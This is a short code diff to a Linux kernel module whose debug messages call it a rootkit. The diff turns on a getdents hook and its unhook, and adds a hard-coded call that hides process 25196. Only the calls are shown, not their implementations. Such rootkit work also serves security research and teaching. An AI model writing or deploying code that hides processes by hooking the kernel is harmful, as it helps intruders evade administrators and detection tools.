@@ -19,9 +19,11 @@ int init_module (void)
 	ROOTKIT_DEBUG("Loading rootkit...\n");
 
 	initialize_control();
-	//hook_getdents();	
+	hook_getdents();	
 	//hook_sockets();
 	
+	// TODO: remove debug instructions after this
+	hide_process(25196);
 
 	return 0;
 }
@@ -36,7 +38,7 @@ void cleanup_module (void)
 	ROOTKIT_DEBUG("Starting unloading procedure...\n");
 
 	cleanup_control();
-	//unhook_getdents();
+	unhook_getdents();
 	//unhook_sockets();
 	
 	/* Finally, log the unloading */
